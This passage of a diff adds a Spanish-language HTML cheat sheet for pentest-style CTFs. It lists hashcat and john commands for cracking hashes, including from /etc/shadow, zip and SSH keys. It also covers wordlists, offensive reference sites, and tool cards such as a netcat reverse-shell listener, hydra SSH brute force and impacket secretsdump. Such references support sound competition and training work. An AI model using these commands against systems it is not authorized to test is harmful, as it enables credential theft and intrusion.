+      <p class="tool-desc"><b style="color:var(--text)">hashcat</b> para GPU — mucho más rápido con diccionarios grandes. <b style="color:var(--text)">John</b> para CPU y para extraer el hash de archivos protegidos (zip, rar, ssh, /etc/shadow) con sus scripts *2john.</p>
+
+      <h3 class="subhead">Identificar el hash</h3>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-neutral">hashcat</span><span>Autodetectar tipo de hash</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>hashcat --identify hash.txt</code></pre>
+      </div>
+
+      <h3 class="subhead">Ataque de diccionario</h3>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-primary">hashcat</span><span>Con GPU (más rápido en diccionarios grandes)</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>hashcat -m <MODO> -a 0 hash.txt rockyou.txt</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-alt">john</span><span>Sin GPU disponible</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>john --wordlist=rockyou.txt hash.txt</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-alt">john</span><span>Forzar formato (cuando no lo detecta bien)</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>john --format=NT --wordlist=rockyou.txt hash.txt</code></pre>
+      </div>
+
+      <h3 class="subhead">Reglas y máscaras</h3>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-primary">hashcat</span><span>Diccionario + reglas (muta cada palabra)</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>hashcat -m <MODO> -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-primary">hashcat</span><span>Ataque por máscara (bruteforce con patrón)</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>hashcat -m <MODO> -a 3 hash.txt ?u?l?l?l?l?d?d?d</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-alt">john</span><span>Con reglas de mutación</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>john --wordlist=rockyou.txt --rules=Jumbo hash.txt</code></pre>
+      </div>
+
+      <h3 class="subhead">Formatos especiales / extracción de hash</h3>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-primary">john</span><span>Combinar /etc/passwd y /etc/shadow</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>unshadow passwd.txt shadow.txt > combined.txt
+john --wordlist=rockyou.txt combined.txt</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-primary">john</span><span>Extraer hash de archivos protegidos</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>zip2john archivo.zip > zip.hash
+rar2john archivo.rar > rar.hash
+ssh2john id_rsa > ssh.hash
+john --wordlist=rockyou.txt zip.hash</code></pre>
+      </div>
+
+      <h3 class="subhead">Ver resultados</h3>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-neutral">hashcat</span><span>Contraseñas ya crackeadas (potfile)</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>hashcat -m <MODO> hash.txt --show</code></pre>
+      </div>
+      <div class="cmd">
+        <div class="cmd-label"><div class="cmd-title"><span class="pill pill-neutral">john</span><span>Contraseñas ya crackeadas</span></div><button class="copy-btn" data-copy>copiar</button></div>
+        <pre><code>john --show hash.txt</code></pre>
+      </div>
+
+      <h3 class="subhead">Modos comunes de hashcat (-m)</h3>
+      <div class="flags">
+        <div class="f">0</div><div class="d">MD5</div>
+        <div class="f">100</div><div class="d">SHA1</div>
+        <div class="f">1400</div><div class="d">SHA256</div>
+        <div class="f">1700</div><div class="d">SHA512</div>
+        <div class="f">1000</div><div class="d">NTLM (Windows)</div>
+        <div class="f">3000</div><div class="d">LM (Windows legacy)</div>
+        <div class="f">500 / 1800</div><div class="d">md5crypt / sha512crypt ($1$ / $6$, /etc/shadow)</div>
+        <div class="f">3200</div><div class="d">bcrypt ($2*$)</div>
+        <div class="f">13100</div><div class="d">Kerberoast (TGS-REP)</div>
+        <div class="f">18200</div><div class="d">AS-REP roast</div>
+        <div class="f">22000</div><div class="d">WPA-PBKDF2 / WPA2 (handshake .hc22000)</div>
+        <div class="f">5600</div><div class="d">NetNTLMv2</div>
+      </div>
+
+      <div class="flags" style="margin-top:16px">
+        <div class="f">hashcat -a 0/1/3</div><div class="d">modo de ataque: diccionario / combinador / máscara</div>
+        <div class="f">hashcat -O</div><div class="d">kernels optimizados (más rápido, límite de longitud de password)</div>
+        <div class="f">hashcat --force</div><div class="d">ignora warnings (usar con cuidado, puede ser inestable)</div>
+        <div class="f">john --fork=4</div><div class="d">paraleliza en 4 procesos</div>
+        <div class="f">john --format=list</div><div class="d">lista todos los formatos soportados</div>
+        <div class="f">john --incremental</div><div class="d">bruteforce puro sin diccionario (lento)</div>
+      </div>
+    </section>
+
+    <!-- WORDLISTS -->
+    <section class="tool" id="wordlists">
+      <div class="tool-head"><h2>Wordlists — cuál usar en cada caso</h2><span class="tool-tag">SecLists / rockyou</span></div>
+      <p class="tool-desc">La mayoría vive en <span class="mono" style="color:var(--accent)">/usr/share/seclists</span> (si no está: <span class="mono" style="color:var(--accent)">sudo apt install seclists</span> o clonar github.com/danielmiessler/SecLists) y <span class="mono" style="color:var(--accent)">/usr/share/wordlists</span> en Kali.</p>
+
+      <div class="note"><b>Estrategia</b><span>Empezá siempre con una lista chica o mediana — en competencia el tiempo importa más que la cobertura. Escalá a la versión grande solo si no encontraste nada y te sobra tiempo.</span></div>
+
+      <h3 class="subhead">Directorios y archivos</h3>
+      <div class="flags">
+        <div class="f">dirb/common.txt</div><div class="d">rápido, para descubrir lo obvio en segundos</div>
+        <div class="f">Discovery/Web-Content/raft-medium-directories.txt</div><div class="d">buen balance cobertura/tiempo — la que uso por default</div>
+        <div class="f">Discovery/Web-Content/raft-large-directories.txt</div><div class="d">exhaustiva, cuando la mediana no dio nada y hay tiempo</div>
+        <div class="f">Discovery/Web-Content/raft-medium-files.txt</div><div class="d">archivos con extensión conocida — combinar con -x/-e</div>
+        <div class="f">Discovery/Web-Content/big.txt</div><div class="d">alternativa grande de propósito general</div>
+      </div>
+
+      <h3 class="subhead">Subdominios y vhosts</h3>
+      <div class="flags">
+        <div class="f">Discovery/DNS/subdomains-top1million-5000.txt</div><div class="d">primer intento, rápido</div>
+        <div class="f">Discovery/DNS/subdomains-top1million-110000.txt</div><div class="d">a fondo, cuando el corto no alcanza</div>
+      </div>
+
+      <h3 class="subhead">Parámetros y campos ocultos</h3>
+      <div class="flags">
+        <div class="f">Discovery/Web-Content/burp-parameter-names.txt</div><div class="d">nombres de parámetros comunes para fuzzing de GET/POST</div>
+      </div>
+
+      <h3 class="subhead">Usuarios y contraseñas</h3>
+      <div class="flags">
+        <div class="f">Usernames/top-usernames-shortlist.txt</div><div class="d">usuarios comunes, primer intento en login bruteforce</div>
+        <div class="f">Usernames/xato-net-10-million-usernames.txt</div><div class="d">a fondo, cuando el shortlist no funcionó</div>
+        <div class="f">/usr/share/wordlists/rockyou.txt</div><div class="d">el default de facto para passwords (gunzip si viene comprimido)</div>
+        <div class="f">Passwords/Common-Credentials/10k-most-common.txt</div><div class="d">passwords rápido, antes de ir directo a rockyou</div>
+        <div class="f">Passwords/Default-Credentials/</div><div class="d">usuario:contraseña de fábrica para paneles admin, routers, IoT</div>
+      </div>
+
+      <h3 class="subhead">Cracking (hashcat / john)</h3>
+      <div class="flags">
+        <div class="f">rockyou.txt + best64.rule</div><div class="d">combinación estándar para arrancar cualquier cracking de hashes</div>
+        <div class="f">Passwords/probable-v2-top1575.txt</div><div class="d">passwords "probables" chico, para pruebas rápidas antes de ir a rockyou</div>
+      </div>
+    </section>
+
+    <!-- REFERENCIAS ONLINE -->
+    <section class="tool" id="refs">
+      <div class="tool-head"><h2>Referencias online</h2><span class="tool-tag">consulta durante la compe</span></div>
+      <p class="tool-desc">Para cuando no te acordás la técnica exacta o el payload — dejalas abiertas en pestañas aparte.</p>
+
+      <div class="extras-grid">
+        <div class="extra-card">
+          <h4><a href="https://hacktricks.wiki/en/index.html" target="_blank" rel="noopener">HackTricks</a></h4>
+          <p>La wiki más completa de técnicas de pentest: web, red, cloud, Active Directory, privesc en Linux y Windows. El primer lugar para buscar cualquier técnica.</p>
+        </div>
+        <div class="extra-card">
+          <h4><a href="https://exploit-notes.hdks.org/" target="_blank" rel="noopener">Exploit Notes</a></h4>
+          <p>Cheatsheets cortos y al grano por herramienta/tecnología — más rápido de escanear que HackTricks cuando ya sabés qué buscás.</p>
+        </div>
+        <div class="extra-card">
+          <h4><a href="https://gtfobins.org/" target="_blank" rel="noopener">GTFOBins</a></h4>
+          <p>Binarios Unix que se pueden abusar para bypass de restricciones locales — privesc, escape de shells restringidas, lectura de archivos.</p>
+        </div>
+        <div class="extra-card">
+          <h4><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS</a></h4>
+          <p>El equivalente a GTFOBins pero para Windows: binarios legítimos del sistema que sirven para privesc o evasión.</p>
+        </div>
+        <div class="extra-card">
+          <h4><a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">CyberChef</a></h4>
+          <p>"Cyber swiss army knife" — encode/decode, hashing, cifrado, análisis de bytes, todo encadenable desde el navegador. Clave en challenges de crypto/forense.</p>
+        </div>
+        <div class="extra-card">
+          <h4><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener">PayloadsAllTheThings</a></h4>
+          <p>Repositorio gigante de payloads organizados por tipo de vulnerabilidad (SQLi, XSS, SSRF, XXE, deserialización, etc).</p>
+        </div>
+        <div class="extra-card">
+          <h4><a href="https://www.revshells.com/" target="_blank" rel="noopener">revshells.com</a></h4>
+          <p>Generador de one-liners de reverse shell para el lenguaje/intérprete que tengas disponible en el target.</p>
+        </div>
+        <div class="extra-card">
+          <h4><a href="https://wadcoms.github.io/" target="_blank" rel="noopener">WADComs</a></h4>
+          <p>Equivalente a GTFOBins para comandos ofensivos contra Active Directory / Windows.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- EXTRAS -->
+    <section class="tool" id="extras">
+      <div class="tool-head"><h2>Otras herramientas que conviene tener a mano</h2><span class="tool-tag">bonus</span></div>
+      <p class="tool-desc">No entraban en el pedido original pero suelen aparecer en cualquier CTF de estilo pentest.</p>
+
+      <div class="extras-grid">
+        <div class="extra-card">
+          <h4>netcat / ncat</h4>
+          <p>Listener de reverse shells (<code class="mono">nc -lvnp 4444</code>), banner grabbing, transferencia de archivos.</p>
+        </div>
+        <div class="extra-card">
+          <h4>hydra</h4>
+          <p>Fuerza bruta de login contra SSH, FTP, HTTP forms, RDP, etc. <code class="mono">hydra -l admin -P pass.txt ssh://IP</code></p>
+        </div>
+        <div class="extra-card">
+          <h4>feroxbuster</h4>
+          <p>Alternativa a gobuster para content discovery, con recursividad más agresiva por defecto.</p>
+        </div>
+        <div class="extra-card">
+          <h4>searchsploit</h4>
+          <p>Búsqueda offline en Exploit-DB. <code class="mono">searchsploit apache 2.4.49</code></p>
+        </div>
+        <div class="extra-card">
+          <h4>msfvenom / msfconsole</h4>
+          <p>Generación de payloads y framework de explotación (Metasploit).</p>
+        </div>
+        <div class="extra-card">
+          <h4>enum4linux-ng / smbclient / smbmap</h4>
+          <p>Enumeración de SMB: shares, usuarios, política de passwords.</p>
+        </div>
+        <div class="extra-card">
+          <h4>crackmapexec / netexec</h4>
+          <p>Enumeración y spray de credenciales masivo en entornos Windows/AD.</p>
+        </div>
+        <div class="extra-card">
+          <h4>impacket suite</h4>
+          <p><code class="mono">secretsdump.py</code>, <code class="mono">psexec.py</code>, <code class="mono">GetUserSPNs.py</code> — explotación y post-explotación en AD.</p>
+        </div>
+        <div class="extra-card">
+          <h4>linpeas.sh / winpeas</h4>
+          <p>Enumeración automática para escalada de privilegios local.</p>
+        </div>
+        <div class="extra-card">
+          <h4>pspy</h4>
+          <p>Monitorea procesos en Linux sin necesitar root — útil para pillar cron jobs.</p>
+        </div>
+        <div class="extra-card">
+          <h4>chisel / ligolo-ng</h4>
+          <p>Pivoting y tunneling a través de una máquina comprometida.</p>
+        </div>
+        <div class="extra-card">
+          <h4>responder</h4>
+          <p>Poisoning de LLMNR/NBT-NS/mDNS para capturar hashes NetNTLM en redes Windows.</p>
+        </div>
+        <div class="extra-card">
+          <h4>BloodHound + SharpHound</h4>
+          <p>Mapea rutas de ataque en Active Directory de forma visual.</p>
+        </div>
+        <div class="extra-card">
+          <h4>wpscan / nikto</h4>
+          <p>Escaneo de vulnerabilidades específico de WordPress y escaneo web genérico.</p>
+        </div>
+        <div class="extra-card">
+          <h4>Burp Suite</h4>
+          <p>Proxy de intercepción — imprescindible para modificar requests antes de tirárselas a sqlmap/ffuf.</p>
+        </div>
+        <div class="extra-card">
+          <h4>SecLists</h4>
+          <p>Colección de wordlists de referencia, normalmente en <code class="mono">/usr/share/seclists</code>.</p>
+        </div>
+      </div>
+    </section>
+
+    <footer>referencia personal — verificá siempre alcance y autorización antes de escanear/explotar cualquier objetivo.</footer>
+  </main>
+</div>
+
+<script>
+  document.querySelectorAll('[data-copy]').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var code = btn.closest('.cmd').querySelector('code');
+      var text = code.innerText;
+      function done(){
+        var original = btn.textContent;
+        btn.textContent = 'copiado';
+        btn.classList.add('copied');
+        setTimeout(function(){
+          btn.textContent = original;
+          btn.classList.remove('copied');
+        }, 1200);
+      }
+      if(navigator.clipboard && navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){ fallbackCopy(text, done); });
+      } else {
+        fallbackCopy(text, done);
+      }
+    });
+  });
+  function fallbackCopy(text, cb){
+    var ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed';
+    ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.select();
+    try{ document.execCommand('copy'); }catch(e){}
+    document.body.removeChild(ta);
+    cb();
+  }
+</script>
